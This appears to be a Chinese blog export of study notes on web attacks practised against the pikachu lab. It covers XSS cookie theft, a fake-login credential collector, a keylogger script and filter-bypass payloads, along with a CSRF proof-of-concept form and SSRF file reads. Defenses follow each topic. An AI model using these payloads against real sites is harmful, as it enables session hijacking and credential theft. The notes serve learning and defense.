<p>XSS语句的基本特点是利用各类JS脚本特性来设计触发点，攻击代码则可利用各类型编码或者外部引用方式进行加载。</p>
<blockquote>
<p>IE\Chrome\Firefox浏览器中的XSS Filter（针对XSS攻击的过滤器）包含语句非常全面。</p>
<p>过滤机制在于会<strong>提前识别</strong>post或get方法传递参数过滤中是否存在跨站代码，再根据服务器的响应包内容进行判断，如果存在则禁止显示。</p>
</blockquote>
<h4 id="3-测试总结"><a href="#3-测试总结" class="headerlink" title="3.测试总结"></a>3.测试总结</h4><p>学到了挖洞流程，在测试过程中，先判断漏洞存在的基本环境、条件，再构造XSS语句。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617001208515.png" alt="xss漏洞测试总结"></p>
<h3 id="8-利用方式"><a href="#8-利用方式" class="headerlink" title="8.利用方式"></a>8.利用方式</h3><p>弹窗测试只是用来证明XSS的存在，但远远不能说明XSS的危害。</p>
<p>但是OWASP TOP10多次把XSS威胁列在前位。</p>
<p>常见利用方式如下。</p>
<h5 id="1-窃取Cookie"><a href="#1-窃取Cookie" class="headerlink" title="1.窃取Cookie"></a>1.窃取Cookie</h5><blockquote>
<p>由于HTTP的特性，Cookie是目前Web系统识别用户身份和会话保存状态的主要方式。一旦应用程序中存在跨站脚本执行漏洞，那么攻击者就能利用XSS攻击轻而易举地获取被攻击者的Cookie信息，<strong>并伪装成当前用户登录，执行恶意操作等行为</strong>。</p>
<p>如果受害用户是管理员，那么攻击者甚至可以轻易地获取Web系统的管理权限。这类权限通常会有文件修改、上传，连接数据库等功能，再配合后续的攻击，会给当前Web应用安全带来很大的威胁。</p>
</blockquote>
<p>假设攻击者在一个常规运行的网站的留言板上发现了一个存储型的XSS漏洞，那么攻击者就可以使用下面的代码进行跨站攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://localhost:81/pikachu/vul/xss/xssblind/test.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当用户浏览到留言板上的这条信息时，浏览器会加载这段留言信息，从而触发了这个JS攻击脚本。攻击脚本便会读取该正常网站下的用户Cookie，并将Cookie作为参数以GET方式提交到攻击者的远程服务器<a href="http://www.xxx.com。在该远程服务器中，攻击者事先准备好了一个cookie.php放在Web根目录，代码如下：">www.xxx.com。在该远程服务器中，攻击者事先准备好了一个cookie.php放在Web根目录，代码如下：</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$log = fopen(&quot;../cookie.txt&quot;,&quot;a&quot;);//写了个目录路径</span><br><span class="line">Fwrite($log,$cookie.&quot;/n&quot;);</span><br><span class="line">Fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当有用户触发攻击时，攻击者服务器中的cookie.php便会接收受害者传入的Cookie，并保存在本地文件cookie.txt中。若Cookie还在有效期内，攻击者便可以利用该Cookie伪装成受害用户进行登录，进行非法操作。</p>
<p><strong>这里怎么触发呢？我按照要求在pikachu的xss盲打同目录下建立了test.php用来将cookie存起来，噢，代码就没有弹cookie嘞</strong></p>
<p>反射型可以，确实txt文件中添加到了。</p>
<h5 id="2-钓鱼攻击"><a href="#2-钓鱼攻击" class="headerlink" title="2.钓鱼攻击"></a>2.钓鱼攻击</h5><p>攻击者精心构造的跨站代码可以实现更多功能，诸如改变网站的前端页面、构造虚假的表单来诱导用户填写信息等。如果攻击者利用一个正规网站的XSS漏洞来伪造一个钓鱼页面，那么与传统的钓鱼网站相比，从客户端浏览器的地址栏看起来XSS伪造的钓鱼页面属于该正规网站，具有非常强的迷惑性。</p>
<blockquote>
<p>像以前的qq环境，有人给你私聊或者是空间留言，伴随了一个陌生链接，引起你的好奇心，点进了一个网址，这个网址居然是网页版的qq登录界面，登录进去后发现什么也没有。第二天，你的qq就出现异地登录了。</p>
</blockquote>
<h6 id="利用401认证实现用户信息钓鱼"><a href="#利用401认证实现用户信息钓鱼" class="headerlink" title="利用401认证实现用户信息钓鱼"></a>利用401认证实现用户信息钓鱼</h6><p>我以pikachu的存储性xss为例，达到的目的是，留言板上触发脚本，弹出认证窗口，输入的用户名和密码，再由另一个php文件保存。</p>
<p>首先写好一个auth.php文件，目的是认证窗口，要求用户重新输入用户名和密码，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 检查变量 $PHP_AUTH_USER 和$PHP_AUTH_PW 的值*/</span></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line"><span class="comment">/* 空值：发送产生显示文本框的数据头部*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate:Basic realm=&quot;&#x27;</span>.<span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;</span><br><span class="line"><span class="comment">/* 变量值存在，检查其是否正确 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//结果发送给接收消息的后台</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://localhost:81/pikachu/vul/xss/xssblind/index.php?username=<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&amp;password=<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_PW&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其次，写一个index.php通过get()方式获取远端传输过来的账号和密码</p>
<p>当然了，为什么用GET。</p>
<p>凭据都是通过请求头部发送的，而不是通过请求体进行传递。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;	</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$referer</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$referer</span>.=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;D:/phpstudy_pro/WWW/pikachu/vul/xss/xssblind/user.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$username</span>.<span class="string">&quot;+++++&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;+++++&quot;</span>.<span class="variable">$referer</span>.<span class="string">&quot;/n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一般是用数据库存储的，我这里用txt文件代替了。</p>
<p>现在去留言板输入xss语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://localhost:81/pikachu/vul/xss/xssblind/auth.php?id=yVCEB3&amp;info=input+your+account&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617102614829.png"></p>
<p>可惜，我反复停留在认证框，登录没法跳转。</p>
<p><strong>所以我的index.php貌似触发不了，嘶，没道理诶。</strong>(chrom和firefox都不行，之后再看吧)</p>
<p>当然了，以上php文件在pikachu的pkxss模块是有的，不需要自己写了。</p>
<p><a href="https://blog.csdn.net/weixin_44720762/article/details/89741520?ops_request_misc=%7B%22request_id%22:%22168696777416800225514033%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168696777416800225514033&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89741520-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA&spm=1018.2226.3001.4187"> XSS钓鱼攻击演示。_三块五的咸菜干的博客-CSDN博客</a></p>
<h5 id="3-窃取客户端信息"><a href="#3-窃取客户端信息" class="headerlink" title="3.窃取客户端信息"></a>3.窃取客户端信息</h5><p>通过使用JS脚本，攻击者可以获取用户浏览器访问记录、IP地址、开放端口、剪贴板内容、按键记录等许多敏感信息，并将其发送到自己的服务器保存下来。</p>
<h6 id="监听用户键盘动作"><a href="#监听用户键盘动作" class="headerlink" title="监听用户键盘动作"></a>监听用户键盘动作</h6><p>当用户在访问登录、注册、支付等页面时，在页面下的按键操作一般都是输入账号、密码等重要信息。如果攻击者在这些页面构造了跨站攻击脚本，便可记录用户的按键信息，并将信息传输到自己的远程服务器，那么用户的密码等资料便发生了泄漏。此处为了更好地演示效果，将监听到的用户按键直接采用网页弹窗弹出。构造的跨站代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var realkey = String.fromCharCode(event.keyCode);</span><br><span class="line">alert(realkey);&#125;</span><br><span class="line">document.onkeydown = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>还是提交到留言板上后，弹窗显示对应按键</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617142543519.png" alt="按键监听"></p>
<p>如果和钓鱼一样，把按键监听结果发送到远程服务器，啧啧。</p>
<h3 id="9-标准防护方法"><a href="#9-标准防护方法" class="headerlink" title="9.标准防护方法"></a>9.标准防护方法</h3><p>已知XSS的原理就是：注入一段能够被浏览器解释执行的代码，并且通过各类手段使得这段代码“镶嵌”在正常网页中，由用户在正常访问中触发。</p>
<p>防御的困难点在于：</p>
<p>1.web浏览器本身就有很多安全问题，而浏览器又是xss的攻击主战场</p>
<p>2.web应用程序有广泛的输入&#x2F;输出交互点</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617142906722.png" alt="xss攻防流程图"></p>
<p>虽然有过滤特殊字符代码，但还是存在一些绕过方式。</p>
<h4 id="过滤特殊字符的绕过"><a href="#过滤特殊字符的绕过" class="headerlink" title="过滤特殊字符的绕过"></a>过滤特殊字符的绕过</h4><p>1.href属性中的伪协议</p>
<p>&lt;a&gt;标签中利用href属性，在用户传入的参数前面加上http:&#x2F;&#x2F;来构成URL。但如果可成功利用传入的参数构造语句为“&lt;a href&#x3D;javascript：alert（’&#x2F;a&#x2F;‘）&gt;adas&lt;&#x2F;a&gt;”，则与直接执行javascript：alert（’&#x2F;a&#x2F;‘）的效果完全相同。</p>
<p>如果冒号被过滤了：</p>
<p>2.利用HTML实体化编码绕过过滤脚本</p>
<p>将“javascript”中的字符“s”进行了实体化编码，对应的HTML实体化编码为&amp;#x73；</p>
<p>3.HTML5新增标签</p>
<p>对于黑名单可以寻找没有过滤的标签，如&lt;math&gt;标签的利用(firefox)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;math&gt;</span><br><span class="line">&lt;maction xlink:href=&quot;javascript:alert(/xss/)&quot;&gt;hello world&lt;/maction&gt;</span><br><span class="line">&lt;/math&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;embed src=&quot;javascript:alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>

<h4 id="使用实体化编码防御"><a href="#使用实体化编码防御" class="headerlink" title="使用实体化编码防御"></a>使用实体化编码防御</h4><p>有了这些特殊符号，攻击者就可以肆意地进行闭合标签、篡改页面、提交请求等行为。在输出内容之前，如果能够对特殊字符进行编码和转义，让浏览器能知道这些字符是被用作文字显示而不是作为代码执行，就会使攻击代码无法被浏览器执行。编码的方式有很多种，每种都适应于不同的环境。下面介绍两种常见的安全编码。</p>
<p>1.HTML编码</p>
<blockquote>
<p>在PHP中，可以使用htmlspecialchars（）来进行编码，HTML是替换编码，告知浏览器哪些特殊字符只能作为文本显示，不能当作代码执行。从而规避了XSS风险。</p>
</blockquote>
<p>2.JavaScript编码</p>
<blockquote>
<p>用户的输入信息有时候会被嵌入JavaScript代码块中，也就是添加”\“进行了转义</p>
</blockquote>
<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>是Cookie的一项属性。如果一个Cookie值设置了这个属性，那么浏览器将禁止页面的JavaScript访问这个Cookie。窃取用户Cookie是攻击者利用XSS漏洞进行攻击的主要方式之一，如果JS脚本不具备读取Cookie的权限，那窃取用户Cookie的这项攻击也就宣告失败了。</p>
<p>但这只是一个防止Cookie被恶意读取的设置，仅仅可阻碍跨站攻击行为偷取当前用户的Cookie信息，并没有从根本上解决XSS的问题。可以搭配以上措施使用。</p>
<p>在PHP下开启HttpOnly的方式如下：</p>
<p>1）找到PHP.ini，寻找并开启标签session.cookie_httponly&#x3D;true，从而开启全局的Cookie的HttpOnly属性。</p>
<p>2）Cookie操作函数setcookie和setrawcookie专门添加了第7个参数来作为HttpOnly的选项，开启方法为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure>



<p>在实际应用中，HttpOnly没有被广泛使用，这是从业务便利性角度进行的选择。比如，在网站做广告推荐时，会利用JS脚本读取当前用户Cookie信息以作精准推广，如果开启HttpOnly，则上述效果会失效。</p>
<h3 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h3><p>了解了xss的原理、条件、利用方式、绕过方式。</p>
<p>XSS漏洞的核心问题在于当前页面<strong>没有明确区分用户参数与代码</strong>，导致由客户端提交的恶意代码会回显给客户端并且执行。</p>
<p><strong>解决XSS漏洞的基本思路是过滤+实体化编码</strong>。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>已有shell的情况下，如何利用xss达到永久控制。</p>
<p>可以去直接修改后台代码，插入xss</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>xss</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu</title>
    <url>/2023/05/21/pikachu/</url>
    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF:"></a>CSRF:</h2><h3 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h3><p>先登录用户，比如lili</p>
<p>通过bp或者f12网络知道了url的修改信息有关参数。</p>
<p><code>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=18235&amp;add=usa&amp;email=lili%40pikachu.com&amp;submit=submit</code></p>
<p>切换用户如lucy</p>
<p>在lucy的登录后的页面上，url复制上述lili时的参数，回车。</p>
<p>发现lucy的信息被改为lili的了</p>
<h3 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h3><p>登录kobe用户，</p>
<blockquote>
<p>姓名:kobe</p>
<p>性别:boy</p>
<p>手机:15988767673</p>
<p>住址:nba lakes</p>
<p>邮箱:<a href="mailto:&#107;&#x6f;&#x62;&#x65;&#64;&#x70;&#x69;&#107;&#x61;&#x63;&#x68;&#117;&#46;&#x63;&#x6f;&#x6d;">&#107;&#x6f;&#x62;&#x65;&#64;&#x70;&#x69;&#107;&#x61;&#x63;&#x68;&#117;&#46;&#x63;&#x6f;&#x6d;</a></p>
</blockquote>
<p>通过bp抓包，右键工具菜单，生成csrf poc，复制写好的表单html文件，放到同文件夹下(csrfpost\)，记为test.html。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15988767673&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>若用户访问该文件，则攻击完成。kobe用户的性别会被改变为girl。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="增加Token验证（常用做法）"><a href="#增加Token验证（常用做法）" class="headerlink" title="增加Token验证（常用做法）"></a>增加Token验证（常用做法）</h4><p>对关键操作增加Token参数，token必须随机，每次都不一样</p>
<h4 id="关于安全的会话管理（避免会话被利用）"><a href="#关于安全的会话管理（避免会话被利用）" class="headerlink" title="关于安全的会话管理（避免会话被利用）"></a>关于安全的会话管理（避免会话被利用）</h4><ol>
<li>不要在客户端保存敏感信息（比如身份验证信息）</li>
<li>退出、关闭浏览器时的会话过期机制</li>
<li>设置会话过机制，比如15分钟无操作，则自动登录超时</li>
</ol>
<h4 id="访问控制安全管理"><a href="#访问控制安全管理" class="headerlink" title="访问控制安全管理"></a>访问控制安全管理</h4><ol>
<li>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码</li>
<li>敏感信息的修改使用POST，而不是GET</li>
<li>通过HTTP头部中的REFERER来限制原页面</li>
</ol>
<h4 id="增加验证码"><a href="#增加验证码" class="headerlink" title="增加验证码"></a>增加验证码</h4><p>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）<br>————————————————<br>版权声明：本文为CSDN博主「玉米同学」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_50339832/article/details/117606870">https://blog.csdn.net/weixin_50339832/article/details/117606870</a></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h2><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><p>服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h3 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h3><p>这里要开高版本php，5.3版本进入ssrf会报错。</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>页面所在路径为：</p>
<p><code>http://localhost:81/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:81/pikachu/vul/ssrf/ssrf_info/info1.php</code></p>
<p>1.在ssrf_info文件夹下新建一个1.php文件</p>
<p>内容为：</p>
<blockquote>
<?php

   echo "\<script>alert(document.cookie)\</script>";

?>
</blockquote>
<p>2.利用file伪协议，访问host文件</p>
<p><code>http://localhost:81/pikachu/vul/ssrf/ssrf_curl.php?url=file://C:\Windows\System32\drivers\etc\hosts</code></p>
<p>3.利用http协议，获取内网端口信息</p>
<p><code>?url=http://127.0.0.1:3306</code></p>
<h4 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content:"></a>file_get_content:</h4><p>对本地和远程的文件进行读取，把整个文件读入一个字符串中。(**file_get_contents()**只能通过GET方式获得数据。curl()可以进行DNS缓存，同一资源只需查询一次。更加快速且稳定，但配置较为麻烦，适合访问量大的应用)</p>
<p>主要是访问文件用的，file&#x3D;file:&#x2F;&#x2F;…。</p>
<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>   1.做好对目标地址的过滤。使用DNS缓存或者Host白名单的方式。解析出要请求的地址所对应的 IP，如果这个 IP 是内网 IP 的话，就必须拒绝这次请求。</p>
<ol start="2">
<li>限制可以请求的协议，通常只允许 http&#x2F;https 协议，避免被利用file，gopher等协议。</li>
</ol>
<p>   3.限制可以请求的端口号，通常情况下，http 协议只允许 80 端口访问；https 协议只允许 443 端口访问。</p>
<p>————————————————<br>版权声明：本文为CSDN博主「发奋的鼹鼠」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_43660551/article/details/124809230">https://blog.csdn.net/qq_43660551/article/details/124809230</a></p>
<h2 id="Dom型xss"><a href="#Dom型xss" class="headerlink" title="Dom型xss:"></a>Dom型xss:</h2><p>DOM即文档对象模型，当一个页面被创建好，并加载到浏览器时，DOM就会把网页文档转化为一个文档对象，在这个文档对象中，会出现一个倒树的层次结构。</p>
<p>假如有这么一段html代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文档标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>我的链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>文档对象模型所基于的文档视图结构为：</p>
<p><img src="/../../../Typora/img111/image-20230530131755990.png" alt="image-20230530131755990"></p>
<p><strong>把DOM理解为JS访问HTML的标准编程接口。DOM是纯前端的操作</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>易得，输入框中输入的便是str。</p>
<p>故构造payload</p>
<p><code>&#39; onclick=&quot;alert(1)&quot;&gt;</code></p>
<p>即有<code>&lt;a href=’ ‘ onclick=&quot;alert(1)&quot;&gt;</code></p>
<h2 id="php反序列化："><a href="#php反序列化：" class="headerlink" title="php反序列化："></a>php反序列化：</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>php中serialize()，unserialize()</p>
<p><strong>反序列化unserialize()</strong>:将一个对象变为可传输的字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    public $test=&quot;pikachu&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$s=new S(); //创建一个对象</span><br><span class="line">serialize($s); //把这个对象进行序列化</span><br><span class="line">序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">    O:代表object</span><br><span class="line">    1:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    1:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    4:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    7:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br></pre></td></tr></table></figure>

<p><strong>反序列化unserialize()</strong>:将被序列化的字符串还原为对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line"> echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure>

<p>这两个函数本身没有问题，但是如果后台不正当地使用了PHP中的魔法函数，将会导致安全问题。</p>
<p>即通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p>
<h4 id="常见的几个魔法函数"><a href="#常见的几个魔法函数" class="headerlink" title="常见的几个魔法函数:"></a>常见的几个魔法函数:</h4><blockquote>
